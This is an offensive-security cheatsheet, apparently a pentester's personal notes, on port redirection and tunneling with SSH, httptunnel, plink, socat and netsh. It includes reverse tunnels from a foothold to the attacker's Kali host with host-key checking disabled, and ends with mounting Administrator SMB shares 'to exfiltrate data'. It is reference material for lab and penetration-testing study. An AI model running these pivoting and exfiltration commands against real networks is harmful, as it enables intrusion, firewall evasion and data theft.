# Port Redirection And Tunneling

This article is about Port Forwarding, SSH Tunneling and Traffic encapsulation, if you require combining these techniques with [[Proxies]] follow the link. These techniques are tools to manipulate the directional flow of targetted traffic. This is useful in restrictive network environments and similiar to the NFS mounting done after [[NFS-Recon]] it has similiar quality of being (mind-melting). Hosts can be self referencial and ports can be reused; combining a set of firewall rules that will allow traffic from specific port things can get complicated.

## Security Considerations At Both Ends

It may be suitable to create a specific user without access to any consoleon your machine. 

```bash
useradd tunneluser -m -d /home/tunneluser -s /bin/true
passwd tunneluser
```

Firewalls maybe present and require configuration, turning off(very noisey) or just enumerating - either with simple port scan or just using your brain to make assumption that the specific traffic and traffic type to and from specific ports is expected  
```powershell
# Add a firewall rule 
netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80
# More additions incoming at some point
```

## Traffic encapsulation

[Tunneling(Protocol)](https://en.wikipedia.org/wiki/Tunneling_protocol), encapsulating traffic within a different protocol to carry the original traffic inside another protocol(which is not prohibited) over a once incompatible delivery network. By exploitation of encapsulation it allows for private netwokr communications to be sent accross a public network.

## Port Forwarding

[Port forwarding](https://en.wikipedia.org/wiki/Port_forwarding), is a method to direct your traffic from one IP address and selected port forwarding it to another address and port. More specifically utilising NAT (see [[Network-Address-Translation-Defined]] to redirect a communication request from one `address` and `port` to another while the packets are traversing a network gateway, such a router or firewall. There are three types:
1. Local port forwarding - local computer to another server bypassing local infrastructure `ssh -L <local port>`
2. Remote port forwarding - enables server side applications to access client side, connecting to a remote network service located at the tunnel's client side.
3. Dynamic port forwarding - traversal of a firewall or NAT through firewall pin holes, configuring SOCKs or other [[Proxies]] to direct traffic..

The client machine on the network behind the firewall is not routed such it does not have access to the internet. Beware an actual  Internet-disconnected internal network may not have a working external DNS.

```goat
				  {Internet}
				  	  ^
					  |
______				  |										 ______
[[  ]] ---------> [FIREWALL] <-----/NO ROUTE TO INTERNET-----[[  ]] 
/===/														 /===/
   
Attacker													 Client
```

The firewall rules for examplification means only allow all traffic recieved from port 80 remotely, thus by port forwarding using port 80.
```goat
 	___________{Internet}_____LOCAL_PORT_FORWARDING_____________
   |				  ^											|
   |				  |											|
  START 		      |											|
______				  |										 ______
[[  ]] ---------> [FIREWALL] <-----/NO ROUTE TO INTERNET-----[[  ]] 
/===/														 /===/
Attacker													 Client
```
We can use netcat to verify and validate connectivity:
```bash
nc -nvv $Client-IP $firewall-happy-port
```

Then use tool of choice to port forward! See Tools section of this article.

## SSH Tunneling & Local Port Forwarding

[SSH](https://www.ssh.com/academy/ssh/protocol) is encrypted and bi-directional, which equates to secure and can handle transference. `ssh` local port forwarding allows us to tunnel a local port to a remote server using `ssh` as a transport protocol. `ssh` Local port forwarding allows one to pivot into another internally connected network that is not exposed via the same exploit chain that allowed you the breach the network in the first place. Without transfering your tools to the compromised client, you just tunnel your traffic through the compromised client.  See [[SSH-Cheatsheet]]. 

```bash
# From Attack box
# Local port forwarding
# ssh -N -L [bind_address:]$port:host:hostport [username@address]
ssh -L 127.0.0.1:8080:127.0.0.1:80 user@10.10.10.10 -p 2222
ssh -f -N -L $port:127.0.0.1:port user@ip -i id_rsa

# If you want to access a remote server using a private key.
-i id_rsa
# For local port 
-L local_port:remote_address:remote_portforwarding.
# For remote port forwarding.
-R port:local_address:local_port
# Dynamic port forwarding. Creates a socks proxy on localhost. 
-D local_PORT
# Do not execute a remote command, useful for just forwarding ports
-N 
# To background just before command execution
-f
```

If you do not want to break your ssh connection [konami from SANs](https://www.sans.org/blog/using-the-ssh-konami-code-ssh-control-sequences/) discusses using the key seqeunces ssh client:
-  `~.` - terminate connection (and any multiplexed sessions)
-  `~B` - send a BREAK to the remote system
-  `~C` - open a command line
-  `~R` - request rekey
-  `~V/v` - decrease/increase verbosity (LogLevel)
-  `~^Z` - suspend ssh
-  `~#` - list forwarded connections
-  `~&` - background ssh (when waiting for connections to terminate)
-  `~?` - this message
-  `~~` - send the escape character by typing it twice
-   (Note that escapes are only recognized immediately after newline.)


If you need ssh-keys
```bash
ssh-keygen
cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys
chmod 644 id_rsa.pub
```

If running through some shells like Meterpreter we need to have some host key acceptable, without using our Kali Password!
```bash
ssh -f -N -R $kali-port-for-ssh:$ssh-ip-connection:22 -R $kali-port-second-for-Service:$Network-IP:$Service-Port-To-Tunnel-To$ -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/keys/id_rsa kali@$kali-IP 
```
For the keys and assured non-interactivity of ssh to tunnel correctly:
```bash
mkdir /tmp/key -p; cd keys
ssh-keygen 
#Enter location: /tmp/key/id_rsa
	from="$foothold-ssh-ip",command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-X11-forwarding,no-pty ssh-rsa ssh-rsa $ssh-rsa=$(cat id_rsa) $foothold-user-base-reverse-shell@poornetwork
```
This entry will allow the foothold key owner of the private key to log in to Kali, without RCE-ing ourselves and allows for port forwarding.

Back to the trusty ascii art:
```goat
______	
[[  ]] ---------> {Internet}
/===/				  ^
Attacker			  |
				  	  |										 
		   _______[FIREWALL] 
		  |
______	  |	  ______					  			 ______
[[  ]]<------>[[  ]]-----Not routed to firewall----->[[  ]] 							
/===/		  /===/						 			 [[  ]]	
Client		 Client						  			Server										 
```

Local port forward with `ssh` to bypass firewall that is allowing inbound and outbound connection from specific ports, then using some service to tunnel traffic to the `Server`
```goat				
	________{_____SSH Tunnel_____}___
	^		  {                 }	|
	|			{		      }		|
______			 {		    }		|
[[  ]] ---------> {Internet}		|
/===/				  ^				|
Attacker			  |				|
				  	  |				|
		   _______[FIREWALL]		|
		  | 						|
		  |		____________________|
		  |		|	
		  |		|	
		  |		|   _______________Service Interaction_________
		  |		V  |										   |
______	  |	   ______					  			  ______   |
[[  ]]<------->[[  ]]-----Not routed to firewall----->[[  ]]<---						
/===/		   /===/						 		  [[  ]]	
Client		  Client						  		  Server										 
```

Check the service configuration file to be compatible with whatever servers, clients and network environments Attacker is operating for example SMB with Kali:
```bash
cat -n /etc/samba/smb.conf | grep "min protocol"
# edit
# And restart <insert service> service or with systemctl
sudo /etc/init.d/smbd restart
```

Then we can just connect from our localhost configured to route traffic throught the SSH tunnel:
```bash
smbclient -L 127.0.0.1 -U Administrator
```

## SSH Remote Port Forwarding

Reversal of Local port fowarding as port is **opened** from the remote side of the connection and the traffic is forwarded to a port back to local box with remote flag with `ssh -R`.

```bash
# Syntax: ssh -N -R [bind_address:]port:host:hostport [username@address]
ssh -N -R $Attacker_IP:$Listening_port:$remotes_127-0-0-1:$port_forwarded_through attacker@$Attacker_IP
```

Ascii Art:
```goat
 	___________{Internet}_____REMOTE_PORT_FORWARDING_____________
   |				  ^											|
   |				  |											|
   |  		    	  |										  START
______				  |										 ______
[[  ]] ---------> [FIREWALL] <-----/NO ROUTE TO INTERNET-----[[  ]] 
/===/														 /===/
Attacker													 Client
```
Notice that the `START` point differs from the `START` for Local Port Forwarding

## SSH Dynamic Port Forwarding

Setting a local listiening port and have it tunnel incoming traffic to any remote destination through a proxy, see [[Proxies]] from more information on setting them up.

```bash
# Syntax
# ssh -N -D <address to bind to>:<port to bind to> <username>@<SSH server address>
ssh -N -D 127.0.0.1:$port $user@$SSH_server_address
```

See [[Proxies]] for `proxychains` configuration.

```goat				
	________{_____SSH_Tunnel_______}_
	^		  {                  }	|
	|		   { 				}	|
	|			{				}	|
[SOCKS]		  	  {		      }		|
[PROXY]			{             }		|
______			 {		    }		|
[[  ]] ---------> {Internet}		|
/===/				  ^				|
Attacker			  |				|
				  	  |				|
		   _______[FIREWALL]		|
		  | 						|
  ________|_________________________|
 |		  |		|	|
 |		  |		|	|
 |		  |		|   ___________________________________________			
 |		  |		V  										   	   |
______	  |	   ______					  			  ______   |
[[  ]]<------->[[  ]]-----Not routed to firewall----->[[  ]]<---						
/===/		   /===/						 		  [[  ]]	
Client		  Client						  		  Server										 
```
With `proxychains` we can execute commands from the end point of the SSH tunnel.
```bash
sudo proxychains <whatever command>
```

## HTTPTunnel-ing through deep packet inspection

Deep packet content  inspection devices exist and may only allow specific protocols. `httptunnel` uses a client/server model to  encapsulate the traffic within HTTP requests. Similarly for TLS encryption [Stunnel](https://www.stunnel.org/) *is a proxy designed to add TLS encryption functionality to existing clients and servers without any changes in the programs' code.*

```goat			
	__(htc_client)_{__HTTPTunnel_}__
	^		  	{              }	|
	|			{		      }		|
______			 {		    }		|
[[  ]] ---------> {Internet}		(htc client/server)
/===/				  ^				|
Attacker			  |				|
				  	  |				|
		   _______[FIREWALL]		|
		  | 						|
		  |		____________________|
		  |		|	
		  |		(hts server)
		  |		|   _____________Local_Port_Forward____________
		  |		V  |										   |
______	  |	   ______					  			  ______   |
[[  ]]<------->[[  ]]-----Not routed to firewall----->[[  ]]<---						
/===/		   /===/						 		  [[  ]]	
Client		  Client						  		  Server										 
```

Attacker `htc --forward-port 8080 $tunnel_server_ip:$tunnel_server_port`
Client `hts --forward-port localhost:8888 $tunnel_server_port` + `ssh -L 0.0.0.0:8888:$distination_ip$:destrination_port $client_user@127.0.0.1`

## Tools

#### Rinetd
[Rinetd](https://github.com/samhocevar/rinetd) - github version linked as his personal website has a certificate issues..

#### Chisel

[Chisel](https://github.com/jpillora/chisel) *Chisel is a fast TCP/UDP tunnel, transported over HTTP, secured via SSH. Single executable including both client and server. Written in Go (golang). Chisel is mainly useful for passing through firewalls, though it can also be used to provide a secure endpoint into your network.*

![demo](Images/chisel-picture-github.png)

#### HTTPTunnel 

Kali supported
```bash
sudo apt install httptunnel
```

#### PLINK.exe

[PLINK](https://the.earth.li/~sgtatham/putty/0.53b/htmldoc/Chapter7.html)Windows based tool to perform port forwarding

```powershell
# plink.exe
# Plink: command-line connection utility
# Release 0.70
# Usage: plink [options] [user@]host [command]
#        ("host" can also be a PuTTY saved session name)
# Options:
#   -V        print version information and exit
#   -pgpfp    print PGP key fingerprints and exit
#   -v        show verbose messages
#   -load sessname  Load settings from saved session
#   -ssh -telnet -rlogin -raw -serial
#             force use of a particular protocol
#   -P port   connect to specified port
#   -l user   connect with specified username
#   -batch    disable all interactive prompts
#   -proxycmd command
#             use 'command' as local proxy
#   -sercfg configuration-string (e.g. 19200,8,n,1,X)
#            Specify the serial configuration (serial only)
# The following options only apply to SSH connections:
#   -pw passw login with specified password
#   -D [listen-IP:]listen-port
#             Dynamic SOCKS-based port forwarding
#   -L [listen-IP:]listen-port:host:port
#             Forward local port to remote address
#   -R [listen-IP:]listen-port:host:port
#             Forward remote port to local address
#   -X -x     enable / disable X11 forwarding
#   -A -a     enable / disable agent forwarding
#   -t -T     enable / disable pty allocation
  
C:\Users\Hacker\Tools> plink.exe -ssh -l $attacker_user -pw $attacker_passwordd -R $remote_ip:$remote_port:127.0.0.1:$target_port $remote_ip # remote being connecting back to a user on that $remote_ip

# Pipe it through to prevent interaction from windows host, so cmds from attacker host proxy through
cmd.exe /c echo y | plink.exe <options>
```

## Socat 

See [[Socat-Cheatsheet]] for more uses, although robust and can encrypt traffic the disadvantages of using socat is that we need to transfer it to the pivot host.
```bash
# A = Attacker, B = Pivot host, C = Server

# ssh tunnel with socat
socat TCP4-LISTEN:$port,reuseaddr,fork TCP4:domain.com:ssh

# Listener on pivot host forward any connect to 
# A -> 3389 B -> 3389 C
socat TCP4-LISTEN:3389,fork TCP4:$forwarded_to_address:3389

# If we need to exploit port 80 on attacker's machine for the server
# A 80 <- B 80 <- Server
socat TCP4-LISTEN:80,fork TCP4:$attacker_ip:80
```

## With SYSTEM level Windows Access..

With SYSTEM level Windows access we can use `netsh`. First `IP Helper service` is running and it must have IPv6 support enabled for interface to work.
```powershell
# Configure firewall to allow traffic
netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=$local_ip localport=$local_port action=allow
# Connect back
netsh interface portproxy add v4tov4 listenport=$port listenaddress=$IP connectport=$local_port connectaddress=$connect_address
```
You can then use sbmclient, see [[SMB-Recon-Cheatsheet]], and mount to the share to exfilitrate data.
```bash
# Set correct protocol in smb.conf
sudo /etc/init.d/smbd restart
# List shares, port forward generates an timeout error
smbclient -L $target_address --port=$firewall_happy_port_from_above --user=Administrator
# Mount into shares to interact
sudo mkdir /mnt/$local_share
sudo mount -t cifs -o port=$firewall_happy_port_from_above //$target_address/$remote_share -o username=Administrator,password=$password /mnt/$local_share
````

## Reference

[Tunneling(Protocol) Wiki](https://en.wikipedia.org/wiki/Tunneling_protocol)
[Port forwarding Wiki](https://en.wikipedia.org/wiki/Port_forwarding)
[SSH has an academy](https://www.ssh.com/academy/ssh/protocol)
[PLINK](https://the.earth.li/~sgtatham/putty/0.53b/htmldoc/Chapter7.html)
[Chisel](https://github.com/jpillora/chisel)
[Rinetd](https://github.com/samhocevar/rinetd) - Note: github version linked as his personal website has a certificate issues..
[Stunnel](https://www.stunnel.org/)
[SANS using-the-ssh-konami-code-ssh-control-sequences](https://www.sans.org/blog/using-the-ssh-konami-code-ssh-control-sequences/)